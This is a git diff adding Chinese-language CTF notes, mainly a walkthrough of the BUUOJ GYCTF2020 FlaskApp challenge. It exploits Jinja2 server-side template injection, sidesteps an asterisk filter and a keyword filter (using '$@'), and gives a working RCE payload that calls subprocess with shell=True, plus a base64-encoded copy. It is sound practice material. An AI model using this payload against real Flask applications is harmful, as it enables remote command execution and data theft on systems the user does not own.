@@ -4791,7 +4791,34 @@ password：3fab54a50e770d830c0416df817567662a9dc85c,54eae8935c90f467427f05e4ece8
 hint：my fav word in my fav paper? !,my love is…?, the password is password;
 ```
 
-在源码上面可以知道，密码的加密方法：`sha1($pass."Salz!")`，解密方法是：将上面的所有pdf文件下载下来并计算逐个单词，以`单词+Salz！`
+在源码上面可以知道，密码的加密方法：`sha1($pass."Salz!")`，解密方法是：将上面的所有pdf文件下载下来并计算逐个单词，以`单词+Salz！`做sha1哈希然后与数据库得到的`admin`哈希做对比，一致则正确
+
+## BUUOJ [GYCTF2020]FlaskApp
+
+这题有点好彩，然后看了一下网上的wp，也没找到跟我的做法一样的
+
+首先抓包，题目名和`title`都提示了`Flask`，那么基本上可以确定是SSTI注入了，然后接下来是寻找注入点，由于太菜了一开始没找到，喵了一眼发现注入点就在这，然后就是测试了
+
+![image-20240127003930087](CTF.assets/image-20240127003930087.png)
+
+在这之前，要先说一下，通过抓包可以看到返回了Session字段，那么这里也要把Session伪造考虑进去的。（其实是将解码的结果传给`$_SESSION[message]`，前端再通过`$_SESSION[message]`拿到数据），后面解码之后就可以看到了
+
+由于一开始传入`{{7*7}`返回的是`no no no`，所以以为的是把`{}`做了屏蔽，其实这里屏蔽的是`*`，`{{7+7}}`是可以的，然后翻了一下葵花宝典，一开始用的是`{% if true %} 123 {% endif %}`成功！，但是最后直接就拿`{% print() %}`来传入payload了
+
+然后就是走流程了，这里用的模块一样是`Subprocess.popen`来做的，要说一下的是：`{% print(''.__class__.__base__.subclasses__()) %}`这里可能返回的信息太多了，导致前端没有渲染出来，但是在HTTP的Session中是有记录的，直接解码Session就好
+
+<img src="CTF.assets/image-20240127004724994.png" alt="image-20240127004724994" style="zoom:50%;" />
+
+最后的RCE发现对`flag`也是做了过滤的，翻了一下葵花宝典，也是用`$@`绕过去了，最后flag
+
+```
+{% print(''.__class__.__base__.__subclasses__()[286]('cat /this_is_the_fl$@ag.txt',shell=True,stdout=-1).communicate()[0].strip()) %}
+
+base64编码：
+eyUgcHJpbnQoJycuX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKClbMjg2XSgnY2F0IC90aGlzX2lzX3RoZV9mbCRAYWcudHh0JyxzaGVsbD1UcnVlLHN0ZG91dD0tMSkuY29tbXVuaWNhdGUoKVswXS5zdHJpcCgpKSAlfQ==
+```
+
+
 
 
 
